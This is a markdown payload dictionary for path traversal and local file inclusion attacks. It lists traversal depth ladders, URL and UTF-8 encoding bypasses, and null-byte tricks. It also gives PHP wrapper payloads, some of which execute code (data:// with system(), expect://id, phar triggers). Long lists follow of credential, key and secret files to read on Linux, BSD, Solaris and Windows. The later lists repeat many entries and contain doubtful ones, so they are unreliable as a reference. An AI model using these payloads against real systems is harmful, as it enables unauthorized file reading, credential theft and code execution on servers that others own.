# Payload Dictionary — the traversal/read corpus by purpose

## Purpose: prove the read works — the canary paths

```
/etc/passwd
/etc/hostname
/etc/issue
/etc/os-release
/proc/version
/proc/self/status
C:\Windows\win.ini
C:\Windows\system.ini
C:\Windows\System32\drivers\etc\hosts
/boot.ini                          — old windows
```

The canary: `root:x:0:0:` / `for 16-bit app support` / `[fonts]` —
verbatim content = the read works.

## Purpose: prove traversal depth — the depth ladder

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
```

Depth 1-12 — plus the overflow-depth `..` x N — extra `..` beyond root
is harmless on POSIX (walks off the top, still lands at `/`).

## Purpose: absolute paths — no traversal needed

```
/etc/passwd
/flag
/app/.env
/var/www/html/index.php
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
\Windows\win.ini                   — UNC-ish
\\?\C:\Windows\win.ini             — extended-length
\\.\C:\Windows\win.ini
file:///etc/passwd
file:///C:/Windows/win.ini
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://0.0.0.0/etc/passwd
file://[::1]/etc/passwd
```

## Purpose: traversal variants — encoding family

```
..%2f
%2e%2e%2f
%2e%2e/
..%5c
%2e%2e%5c
%252e%252e%252f
%252e%252e%255c
..%252f
%252e%252e/
....//
....\\ ..// ../\
..\./
\/..\
.\\.\
//../
.../../
..;/                               — Java/Tomcat matrix
%2e%2e%3b                          — ..;
..%00/
../%00/
%00../
```

## Purpose: UTF-8 exotic

```
..%c0%af
..%c0%ae
..%e0%80%af
..%f0%80%80%af
..%ef%bc%8f                        — fullwidth /
..%ef%bc%bc                        — fullwidth \
..%ef%bc%8e                        — fullwidth .
..%c1%9c                           — overlong \
..%c0%9c
..%u2215                           — division slash (some decoders)
..%u2216
..%uFF0F
..%uFF3C
..%uFF0E
```

## Purpose: null-byte / terminator — PHP<5.3.4 + old stacks

```
../../etc/passwd%00
../../etc/passwd%00.png
../../etc/passwd\x00.png
../../etc/passwd.php%00
/etc/passwd%00
/etc/passwd%00.html
?file=../../etc/passwd%00&lang=en
```

## Purpose: PHP wrappers — the read family

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-decode/resource=/etc/passwd    — garbage in, nothing out usually
php://filter/convert.quoted-printable-encode/resource=/etc/passwd
php://filter/convert.uuencode/resource=/etc/passwd
php://input                                              — the request BODY as the file
data://text/plain;base64,<b64>                           — data-as-file
data://text/plain,<?php phpinfo();?>                     — include-time exec
data://text/plain,<?php system($_GET[c]);?>
php://stdin                                              — stdin as file
php://stdout
php://stderr
php://fd/0
php://fd/1
php://fd/2
expect://id                                              — exec via expect
expect://cat%20/etc/passwd
phar://./uploads/x.phar/a
phar:///tmp/x.phar/a
zip://./uploads/x.zip%23shell.php
zip:///tmp/x.zip%23shell.php
glob:///var/www/html/*.php
glob:///*flag*
compress.zlib:///tmp/x.gz
compress.bzip2:///tmp/x.bz2
rar:///tmp/x.rar%23inside.txt
ogg:///tmp/x.ogg
ssh2.shell://user:pass@host:22/xterm
ssh2.exec://user:pass@host:22/id
ssh2.sftp://user:pass@host:22/etc/passwd
ssh2.scp://user:pass@host:22/etc/passwd
http://127.0.0.1/x                                       — SSRF-via-wrapper
ftp://user:pass@host/x
```

## Purpose: the `php://filter` chains — iconv/dechunk/oracle

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=x
php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-encode/resource=x
php://filter/string.toupper|convert.base64-encode/resource=x
php://filter/zlib.deflate|zlib.inflate|convert.base64-encode/resource=x
php://filter/dechunk|convert.base64-encode/resource=x
```

The `|` chains — multiple filters — the iconv UTF-7/charset tricks —
the CVE-2024-2961 glibc-iconv family is deeper — `php-wrappers.md`.

## Purpose: `phar://` deser-trigger

```
phar://./x.jpg/poc.txt              — a .jpg that IS a phar
phar://./uploads/x.phar/anything
phar://./x.phar/a
phar:///tmp/x.phar/a
phar:///var/www/uploads/x.phar/a
phar://./x.phar%00.jpg/a            — null-byte era
```

## Purpose: `zip://`/`rar://` inside-archive

```
zip://./x.zip%23shell.php           — the member after #
zip:///tmp/x.zip%23index.php
zip://./x.zip%23dir/inside.php
rar:///tmp/x.rar%23inside.txt
```

## Purpose: `glob://` — the listing

```
glob:///*
glob://*flag*
glob:///var/www/html/*
glob:///root/*
glob:///home/*/flag*
glob://../../*
```

## Purpose: `file://` — the explicit-scheme

```
file:///etc/passwd
file:///etc/hostname
file:///flag
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://0.0.0.0/etc/passwd
file://[::]/etc/passwd
file://[::1]/etc/passwd
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file://attacker/x                   — remote — usually blocked
file:///proc/self/environ
file:///proc/self/cmdline
```

## Purpose: jar/netdoc — Java

```
jar:file:///x.jar!/inside
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.jar!/BOOT-INF/classes/application.properties
jar:nested:/x.jar/!inside
netdoc:///etc/passwd
netdoc:///C:/Windows/win.ini
```

## Purpose: `/proc/self/*` — the self-recon

```
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
/proc/self/exe
/proc/self/maps
/proc/self/mountinfo
/proc/self/mounts
/proc/self/cgroup
/proc/self/status
/proc/self/limits
/proc/self/net/tcp
/proc/self/net/tcp6
/proc/self/net/udp
/proc/self/net/arp
/proc/self/net/route
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
/proc/self/fd/6
/proc/self/fd/7
/proc/self/fd/8
/proc/self/fd/9
/proc/self/fd/10
/proc/self/fd/11
/proc/self/fd/12
/proc/self/fd/15
/proc/self/fd/20
/proc/self/fd/255
/proc/self/fdinfo/0
/proc/self/loginuid
/proc/self/sessionid
/proc/self/stat
/proc/self/statm
/proc/self/attr/current             — selinux/apparmor context
/proc/self/oom_score
/proc/self/personality
/proc/self/root/etc/passwd          — the chroot-escape
/proc/self/task/*/stack
```

## Purpose: `/proc/N/*` — the other processes

```
/proc/1/environ                     — docker ENV — FLAG often here
/proc/1/cmdline
/proc/1/cwd
/proc/1/root/etc/passwd             — pid 1's root = host root maybe
/proc/net/tcp
/proc/net/tcp6
/proc/net/udp
/proc/net/unix                      — unix sockets
/proc/net/arp
/proc/net/route
/proc/net/if_inet6
/proc/net/fib_trie
/proc/sys/kernel/hostname
/proc/sys/kernel/random/boot_id
/proc/sys/kernel/version
/proc/filesystems
/proc/mounts
/proc/partitions
/proc/swaps
/proc/version
/proc/uptime
/proc/loadavg
/proc/meminfo
/proc/cpuinfo
/proc/cmdline                       — kernel cmdline
/proc/config.gz                     — kernel config
/proc/kallsyms                      — kernel symbols
/proc/modules                       — loaded modules
/proc/interrupts
/proc/iomem
/proc/ioports
/proc/diskstats
/proc/net/dev
/proc/net/snmp
/proc/net/netstat
/proc/net/rt_cache
/proc/net/rpc/nfsd
/proc/locks
/proc/mounts
/proc/diskstats
/proc/misc
/proc/slabinfo
/proc/timer_list
/proc/timer_stats
/proc/dma
/proc/kmsg                          — dmesg — needs root
/proc/kcore                         — kernel memory — huge, needs root
/proc/bus/pci/devices
/proc/bus/usb/devices
/proc/scsi/scsi
/proc/ide/drivers
/proc/sys/fs/file-max
/proc/sys/fs/inotify/max_user_watches
```

## Purpose: Linux app files — source/config

```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php
/var/www/html/composer.json
/var/www/html/package.json
/var/www/index.php
/srv/www/htdocs/index.php
/usr/share/nginx/html/index.php
/usr/local/apache2/htdocs/index.php
/app/main.py
/app/app.py
/app/server.py
/app/index.js
/app/server.js
/app/app.js
/app/config.py
/app/.env
/app/package.json
/app/composer.json
/app/requirements.txt
/app/wsgi.py
/app/config.yml
/app/config.yaml
/app/config.json
/app/settings.py
/opt/app/main.py
/opt/app/app.py
/usr/src/app/main.py
/usr/src/app/server.js
/home/ctf/app.py
/home/ctf/main.py
/home/ctf/index.php
/home/ctf/server.js
/home/app/app.py
/home/app/main.py
/home/user/app.py
```

## Purpose: Linux system files — users/creds/policy

```
/etc/passwd
/etc/shadow                        — root-only usually
/etc/group
/etc/gshadow
/etc/sudoers
/etc/sudoers.d/*
/etc/sudoers.d/README
/etc/hostname
/etc/hosts
/etc/host.conf
/etc/resolv.conf
/etc/nsswitch.conf
/etc/networks
/etc/network/interfaces
/etc/netplan/*.yaml
/etc/sysconfig/network-scripts/*
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/ssh/ssh_host_*_key
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_ed25519_key
/etc/ssl/private/*.key
/etc/ssl/certs/*.pem
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/nginx/sites-enabled/*
/etc/nginx/conf.d/*.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/*.conf
/etc/apache2/ports.conf
/etc/apache2/envvars
/etc/httpd/conf/httpd.conf
/etc/httpd/conf.d/*.conf
/etc/lighttpd/lighttpd.conf
/etc/caddy/Caddyfile
/etc/mysql/my.cnf
/etc/mysql/mariadb.cnf
/etc/mysql/debian.cnf              — debian-sys-maint creds!
/etc/my.cnf
/etc/mongod.conf
/etc/redis/redis.conf
/etc/postgresql/*/main/postgresql.conf
/etc/postgresql/*/main/pg_hba.conf
/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/*
/var/spool/cron/crontab/*
/etc/aliases
/etc/mail/*
/etc/fstab
/etc/mtab
/etc/exports                       — NFS exports
/etc/ld.so.conf
/etc/ld.so.conf.d/*
/etc/ld.so.preload                 — root-only usually
/etc/pam.d/*
/etc/security/limits.conf
/etc/security/pwquality.conf
/etc/login.defs
/etc/adduser.conf
/etc/default/*
/etc/environment
/etc/profile
/etc/profile.d/*
/etc/bash.bashrc
/etc/inputrc
/etc/vim/vimrc
/etc/nanorc
/etc/wgetrc
/etc/curlrc
/etc/apt/sources.list
/etc/apt/sources.list.d/*
/etc/yum.repos.d/*
/etc/dnf/dnf.conf
/etc/pacman.conf
/etc/supervisord.conf
/etc/supervisor/conf.d/*
/etc/systemd/system/*.service
/lib/systemd/system/*.service
/etc/init.d/*
/etc/logrotate.conf
/etc/logrotate.d/*
/etc/rsyslog.conf
/etc/rsyslog.d/*
/etc/syslog.conf
/etc/audit/auditd.conf
/etc/aide/aide.conf
/etc/fail2ban/*
/etc/ufw/*
/etc/iptables/*
/etc/nftables.conf
/etc/hosts.allow
/etc/hosts.deny
/etc/nsswitch.conf
/etc/pam.d/common-auth
/etc/pam.d/sshd
/etc/pam.d/su
/etc/pam.d/sudo
/etc/shadow-
/etc/passwd-
/etc/group-
/etc/subuid
/etc/subgid
/etc/update-motd.d/*
/etc/issue
/etc/issue.net
/etc/motd
/etc/os-release
/etc/lsb-release
/etc/debian_version
/etc/redhat-release
/etc/alpine-release
/etc/machine-id
/etc/dbus-1/system.conf
/etc/systemd/resolved.conf
/etc/resolveconf/*
/etc/netconfig
/etc/ldap/ldap.conf
/etc/openldap/ldap.conf
/etc/krb5.conf
/etc/sssd/sssd.conf                — sssd creds
/etc/ntp.conf
/etc/chrony.conf
/etc/snmp/snmpd.conf               — community strings!
/etc/snmp/snmp.conf
/etc/dhcp/dhclient.conf
/etc/dhcpcd.conf
/etc/wpa_supplicant/wpa_supplicant.conf  — WIFI PASSWORDS
/etc/NetworkManager/system-connections/*
/etc/wireguard/wg0.conf
/etc/openvpn/*
/etc/ipsec.conf
/etc/ipsec.secrets
/etc/ppp/*
/etc/proftpd/proftpd.conf
/etc/vsftpd.conf
/etc/pure-ftpd/*
/etc/samba/smb.conf
/etc/exports
/etc/auto.master
/etc/auto.misc
/etc/autofs.conf
/etc/iscsi/initiatorname.iscsi
/etc/multipath.conf
/etc/mdadm.conf
/etc/lvm/lvm.conf
/etc/crypttab                      — LUKS keys paths
/etc/smartd.conf
/etc/hdparm.conf
/etc/sensors3.conf
/etc/thermald/*
/etc/acpi/*
/etc/udev/rules.d/*
/etc/X11/xorg.conf
/etc/lightdm/lightdm.conf
/etc/gdm3/custom.conf
/etc/cups/cupsd.conf
/etc/cups/printers.conf
/etc/printcap
/etc/services
/etc/protocols
/etc/rpc
/etc/magic
/etc/mime.types
/etc/mailcap
/etc/terminfo/*
/etc/zoneinfo/*
/etc/localtime                     — binary
/etc/adjtime
/etc/locale.conf
/etc/locale.gen
/etc/vconsole.conf
/etc/keymap
/etc/modprobe.d/*
/etc/modules-load.d/*
/etc/sysctl.conf
/etc/sysctl.d/*
/etc/udev/udev.conf
/etc/tmpfiles.d/*
/etc/binfmt.d/*
/etc/cgroup/*
/etc/namespace.conf
/etc/subuid
/etc/subgid
/etc/containers/*
/etc/crio/*
/etc/docker/daemon.json
/etc/docker/key.json
/etc/containerd/config.toml
/etc/rancher/k3s/k3s.yaml          — k3s kubeconfig!
/etc/rancher/k3s/registries.yaml
/etc/kubernetes/admin.conf
/etc/kubernetes/kubelet.conf
/etc/kubernetes/controller-manager.conf
/etc/kubernetes/scheduler.conf
/etc/kubernetes/pki/*
/etc/kubernetes/manifests/*
/etc/ansible/hosts
/etc/ansible/ansible.cfg
/etc/puppet/puppet.conf
/etc/chef/client.rb
/etc/chef/client.pem
/etc/salt/minion
/etc/salt/master
/etc/consul.d/*
/etc/vault/*
/etc/nomad.d/*
/etc/prometheus/prometheus.yml
/etc/grafana/grafana.ini           — admin password!
/etc/grafana/ldap.toml
/etc/influxdb/influxdb.conf
/etc/telegraf/telegraf.conf
/etc/zabbix/zabbix_server.conf
/etc/zabbix/zabbix_agentd.conf
/etc/nagios/*
/etc/icinga2/*
/etc/graylog/server/server.conf
/etc/elasticsearch/elasticsearch.yml
/etc/kibana/kibana.yml
/etc/logstash/conf.d/*
/etc/filebeat/filebeat.yml
/etc/metricbeat/metricbeat.yml
/etc/auditbeat/auditbeat.yml
/etc/heartbeat/heartbeat.yml
/etc/journalbeat/journalbeat.yml
/etc/packetbeat/packetbeat.yml
/etc/osquery/osquery.conf
/etc/osquery/osquery.flags
/etc/carbon/carbon.conf
/etc/collectd/collectd.conf
/etc/munin/*
/etc/cacti/*
/etc/librenms/*
/etc/observium/*
/etc/rt/*
/etc/bugzilla/*
/etc/trac/*
/etc/redmine/*
/etc/gitlab/gitlab.rb
/etc/gitlab/gitlab-secrets.json    — secrets!
/etc/gitlab-runner/config.toml     — runner token!
/etc/jenkins/*
/etc/gitea/app.ini                 — gitea creds
/etc/gogs/app.ini
/etc/rethinkdb/*
/etc/rabbitmq/rabbitmq.config
/etc/rabbitmq/rabbitmq-env.conf
/etc/kafka/server.properties
/etc/zookeeper/zoo.cfg
/etc/cassandra/cassandra.yaml
/etc/scylla/*
/etc/solr/*
/etc/lucene/*
/etc/tomcat*/server.xml            — tomcat-users creds!
/etc/tomcat*/tomcat-users.xml      — TOMCAT CREDS
/opt/tomcat/conf/server.xml
/opt/tomcat/conf/tomcat-users.xml
/usr/share/tomcat/conf/server.xml
/usr/share/tomcat/conf/tomcat-users.xml
/var/lib/tomcat*/conf/server.xml
/var/lib/tomcat*/conf/tomcat-users.xml
/etc/jboss/*
/etc/wildfly/*
/opt/wildfly/standalone/configuration/*.xml
/opt/wildfly/standalone/configuration/mgmt-users.properties
/opt/wildfly/standalone/configuration/application-users.properties
/opt/jboss/standalone/configuration/*.xml
/opt/jboss/standalone/configuration/mgmt-users.properties
/etc/weblogic/*
/opt/oracle/middleware/user_projects/domains/*/config/config.xml
/opt/oracle/middleware/user_projects/domains/*/security/SerializedSystemIni.dat
/etc/nginx/htpasswd
/etc/nginx/.htpasswd
/etc/apache2/.htpasswd
/etc/lighttpd/.htpasswd
/var/www/html/.htpasswd
/var/www/html/.htaccess
/var/www/html/.htgroup
/etc/apache2/conf.d/htpasswd
/etc/squid/squid.conf
/etc/squid/passwd
/etc/squid3/squid.conf
/etc/squid3/passwd
/etc/haproxy/haproxy.cfg
/var/lib/haproxy/*
/etc/varnish/default.vcl
/etc/trafficserver/*
/etc/pound/*
/etc/stunnel/*
/etc/ssh/sshd_config.d/*
/etc/ssh/moduli
/etc/ssh/banner
/etc/ssh/revoked_keys
/etc/skel/.bashrc
/etc/skel/.profile
/etc/profile.d/*
/etc/environment.d/*
/etc/security/access.conf
/etc/security/limits.d/*
/etc/security/pam_env.conf
/etc/security/time.conf
/etc/security/group.conf
/etc/security/namespace.conf
/etc/security/sepermit.conf
/etc/security/capability.conf
/etc/security/opasswd              — old passwords!
/etc/pwquality.conf
/etc/passwd.lock
/etc/shadow.lock
/etc/gshadow.lock
/etc/group.lock
/etc/sudoers.tmp
/etc/sudoers.bak
/etc/passwd.bak
/etc/shadow.bak
/etc/group.bak
/etc/passwd.old
/etc/shadow.old
/etc/passwd.orig
/etc/shadow.orig
/etc/passwd~
/etc/shadow~
/etc/master.passwd                 — BSD
/etc/spwd.db                       — BSD
/etc/pwd.db                        — BSD
/etc/crypto/map                    — Solaris
/etc/security/passwd               — AIX
/etc/security/user                 — AIX
/etc/security/environ              — AIX
/etc/security/limits               — AIX
/etc/security/login.cfg            — AIX
/etc/mnttab                        — Solaris
/etc/vfstab                        — Solaris
/etc/dfs/dfstab                    — Solaris NFS
/etc/inet/hosts                    — Solaris
/etc/inet/netmasks                 — Solaris
/etc/inet/protocols                — Solaris
/etc/inet/services                 — Solaris
/etc/default/login                 — Solaris
/etc/default/su                    — Solaris
/etc/default/passwd                — Solaris
/etc/default/kbd                   — Solaris
/etc/default/init                  — Solaris
/etc/default/sys-suspend           — Solaris
/etc/default/webconsole            — Solaris
/etc/default/nss                   — Solaris
/etc/default/cron                  — Solaris
/etc/default/dhcpagent             — Solaris
/etc/default/ipsec                 — Solaris
/etc/default/keyserv               — Solaris
/etc/default/lu                    — Solaris
/etc/default/metassist.xml         — Solaris
/etc/default/nfslogd               — Solaris
/etc/default/power                 — Solaris
/etc/default/route                 — Solaris
/etc/default/tar                   — Solaris
/etc/default/useradd               — Solaris
/etc/default/utmpd                 — Solaris
/etc/default/yppasswdd             — Solaris
/etc/auto_direct                   — Solaris
/etc/auto_home                     — Solaris
/etc/auto_master                   — Solaris
/etc/nodename                      — Solaris
/etc/release                       — Solaris
/etc/name_to_major                 — Solaris
/etc/name_to_sysnum                — Solaris
/etc/driver_aliases                — Solaris
/etc/driver_classes                — Solaris
/etc/minor_perm                    — Solaris
/etc/removable_devices.conf        — Solaris
/etc/devlink.tab                   — Solaris
/etc/path_to_inst                  — Solaris
/etc/bootrc                        — Solaris
/etc/netconfig                     — Solaris
/etc/netmasks                      — Solaris
/etc/notrouter                     — Solaris
/etc/defaultrouter                 — Solaris
/etc/hostname.*                    — Solaris
/etc/dhcp.*                        — Solaris
/etc/mygate                        — OpenBSD
/etc/myname                        — OpenBSD
/etc/hostname.if                   — OpenBSD
/etc/pf.conf                       — OpenBSD
/etc/bgpd.conf                     — OpenBSD
/etc/ospfd.conf                    — OpenBSD
/etc/ripd.conf                     — OpenBSD
/etc/dhcpd.conf                    — OpenBSD
/etc/ntpd.conf                     — OpenBSD
/etc/iked.conf                     — OpenBSD
/etc/iked/                       — OpenBSD
/etc/isakmpd/isakmpd.conf          — OpenBSD
/etc/isakmpd/isakmpd.policy        — OpenBSD
/etc/ipsec.conf                    — OpenBSD
/etc/acme-client.conf              — OpenBSD
/etc/httpd.conf                    — OpenBSD
/etc/relayd.conf                   — OpenBSD
/etc/smtpd.conf                    — OpenBSD
/etc/snmpd.conf                    — OpenBSD
/etc/sysclean.conf                 — OpenBSD
/etc/sysupgrade.conf               — OpenBSD
/etc/vm.conf                       — OpenBSD
/etc/pkg_add.conf                  — OpenBSD
/etc/installurl                    — OpenBSD
/etc/fstab                         — OpenBSD
/etc/login.conf                    — OpenBSD
/etc/login.conf.db                 — OpenBSD
/etc/passwd                        — OpenBSD
/etc/master.passwd                 — OpenBSD
/etc/pwd.db                        — OpenBSD
/etc/spwd.db                       — OpenBSD
/etc/group                         — OpenBSD
/etc/netstart                      — OpenBSD
/etc/rc                            — OpenBSD
/etc/rc.conf                       — OpenBSD
/etc/rc.conf.local                 — OpenBSD
/etc/rc.firsttime                  — OpenBSD
/etc/rc.securelevel                — OpenBSD
/etc/rc.shutdown                   — OpenBSD
/etc/rc.local                      — OpenBSD
/etc/daily                         — OpenBSD
/etc/weekly                        — OpenBSD
/etc/monthly                       — OpenBSD
/etc/periodic.conf                 — FreeBSD
/etc/periodic.conf.local           — FreeBSD
/etc/rc.conf                       — FreeBSD
/etc/rc.conf.d/*                   — FreeBSD
/etc/rc.d/*                        — FreeBSD
/etc/rc.local                      — FreeBSD
/etc/rc.shutdown                   — FreeBSD
/etc/rc.subr                       — FreeBSD
/etc/login.conf                    — FreeBSD
/etc/login.access                  — FreeBSD
/etc/auth.conf                     — FreeBSD
/etc/nsswitch.conf                 — FreeBSD
/etc/pam.d/*                       — FreeBSD
/etc/sysctl.conf                   — FreeBSD
/etc/sysctl.conf.local             — FreeBSD
/etc/loader.conf                   — FreeBSD
/etc/loader.conf.local             — FreeBSD
/etc/device.hints                  — FreeBSD
/etc/devfs.conf                    — FreeBSD
/etc/devfs.rules                   — FreeBSD
/etc/devd.conf                     — FreeBSD
/etc/ddcmd.conf                    — FreeBSD
/etc/exports                       — FreeBSD
/etc/netconfig                     — FreeBSD
/etc/remote                        — FreeBSD
/etc/gettytab                      — FreeBSD
/etc/ttys                          — FreeBSD
/etc/termcap                       — FreeBSD
/etc/portsentry.conf               — FreeBSD
/etc/portsentry.ignore             — FreeBSD
/etc/portsentry.modes              — FreeBSD
/etc/portsentry.users              — FreeBSD
/etc/hostapd.conf                  — FreeBSD
/etc/wpa_supplicant.conf           — FreeBSD
/etc/bluetooth/*                   — FreeBSD
/etc/ppp/*                         — FreeBSD
/etc/isdn/*                        — FreeBSD
/etc/mail/*                        — FreeBSD
/etc/mail.rc                       — FreeBSD
/etc/aliases                       — FreeBSD
/etc/aliases.db                    — FreeBSD
/etc/sendmail.cf                   — FreeBSD
/etc/mailertable                   — FreeBSD
/etc/virtusertable                 — FreeBSD
/etc/access                        — FreeBSD
/etc/access.db                     — FreeBSD
/etc/local-host-names              — FreeBSD
/etc/trusted-users                 — FreeBSD
/etc/service.switch                — FreeBSD
/etc/service.switch.db             — FreeBSD
/etc/bsdstats.conf                 — FreeBSD
/etc/ntp.conf                      — FreeBSD
/etc/ntp/leap-seconds              — FreeBSD
/etc/ntp.keys                      — FreeBSD
/etc/ntpd.conf                     — FreeBSD
/etc/pf.conf                       — FreeBSD
/etc/pf.os                         — FreeBSD
/etc/pfsync/*                      — FreeBSD
/etc/spamdh.conf                   — FreeBSD
/etc/ipf.conf                      — FreeBSD
/etc/ipnat.conf                    — FreeBSD
/etc/ipmon.conf                    — FreeBSD
/etc/ipfw.conf                     — FreeBSD
/etc/firewall.conf                 — FreeBSD
/etc/ip6addrctl.conf               — FreeBSD
/etc/resolvconf.conf               — FreeBSD
/etc/dhclient.conf                 — FreeBSD
/etc/dhcp6c.conf                   — FreeBSD
/etc/dhcp6s.conf                   — FreeBSD
/etc/rtadvd.conf                   — FreeBSD
/etc/rtsold.conf                   — FreeBSD
/etc/route6d.conf                  — FreeBSD
/etc/ppp.conf                      — FreeBSD
/etc/ppp.secret                    — FreeBSD
/etc/mgetty+sendfax/*              — FreeBSD
/etc/hast.conf                     — FreeBSD
/etc/bsnmpd.config                 — FreeBSD
/etc/casper/*                      — FreeBSD
/etc/cron.d/*                      — FreeBSD
/etc/crontab                       — FreeBSD
/etc/anacrontab                    — FreeBSD
/etc/at.allow                      — FreeBSD
/etc/at.deny                       — FreeBSD
/etc/fbtab                         — FreeBSD
/etc/finger.conf                   — FreeBSD
/etc/fingerprint.db                — FreeBSD
/etc/ftpusers                      — FreeBSD
/etc/ftpd.conf                     — FreeBSD
/etc/hosts                         — FreeBSD
/etc/hosts.allow                   — FreeBSD
/etc/hosts.deny                    — FreeBSD
/etc/hosts.equiv                   — FreeBSD
/etc/hosts.lpd                     — FreeBSD
/etc/inetd.conf                    — FreeBSD
/etc/ipfw.conf                     — FreeBSD
/etc/jail.conf                     — FreeBSD
/etc/krb5.conf                     — FreeBSD
/etc/krb5.keytab                   — FreeBSD
/etc/login.conf                    — FreeBSD
/etc/mac.conf                      — FreeBSD
/etc/manpath.config                — FreeBSD
/etc/mtree/*                       — FreeBSD
/etc/namedb/*                      — FreeBSD
/etc/nfsd.conf                     — FreeBSD
/etc/nsmb.conf                     — FreeBSD
/etc/ntp.conf                      — FreeBSD
/etc/opieaccess                    — FreeBSD
/etc/opiekeys                      — FreeBSD
/etc/opiepasswd                    — FreeBSD
/etc/pam.d/*                       — FreeBSD
/etc/pccard_ether                  — FreeBSD
/etc/periodic/*                    — FreeBSD
/etc/pf.conf                       — FreeBSD
/etc/portsnap.conf                 — FreeBSD
/etc/ppp/*                         — FreeBSD
/etc/printcap                      — FreeBSD
/etc/profile                       — FreeBSD
/etc/rctl.conf                     — FreeBSD
/etc/rc.firewall                   — FreeBSD
/etc/rc.initdiskless               — FreeBSD
/etc/rc.sendmail                   — FreeBSD
/etc/rc.subr                       — FreeBSD
/etc/remote                        — FreeBSD
/etc/resolv.conf                   — FreeBSD
/etc/rpc                           — FreeBSD
/etc/services                      — FreeBSD
/etc/snmpd.config                  — FreeBSD
/etc/ssh/*                         — FreeBSD
/etc/sysconfig                     — FreeBSD
/etc/sysctl.conf                   — FreeBSD
/etc/syslog.conf                   — FreeBSD
/etc/termcap                       — FreeBSD
/etc/ttys                          — FreeBSD
/etc/usbd.conf                     — FreeBSD
/etc/wall_cmos_clock               — FreeBSD
/etc/wpa_supplicant.conf           — FreeBSD
```

## Purpose: Windows files — system + user

```
C:\Windows\win.ini
C:\Windows\system.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\System32\drivers\etc\protocol
C:\Windows\System32\drivers\etc\services
C:\Windows\System32\drivers\etc\lmhosts.sam
C:\Windows\System32\config\SAM         — locked usually
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SOFTWARE
C:\Windows\System32\config\NTUSER.DAT
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\SYSTEM
C:\Windows\System32\config\RegBack\SECURITY
C:\Windows\System32\config\RegBack\SOFTWARE
C:\Windows\System32\config\RegBack\DEFAULT
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\repair\SECURITY
C:\Windows\repair\SOFTWARE
C:\Windows\repair\DEFAULT
C:\Windows\Panther\Unattend.xml         — unattend — ADMIN PASSWORDS
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\Sysprep.xml
C:\Windows\System32\Sysprep\Panther\unattend.xml
C:\Windows\System32\Sysprep\Panther\Sysprep.xml
C:\Windows\System32\Sysprep\Panther\IE\unattend.xml
C:\Windows\System32\Sysprep\Panther\IE\Sysprep.xml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.xml   — domain scripts
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.bat
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ps1
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.vbs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cmd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hta
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.js
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.jse
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wsf
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wsh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.reg
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ini
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.inf
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.txt
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cfg
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.conf
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.config
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.yml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.yaml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.json
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.log
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.csv
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.xlsx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.doc
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.docx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.pdf
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.zip
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.tar
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.tar.gz
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.7z
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.rar
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.iso
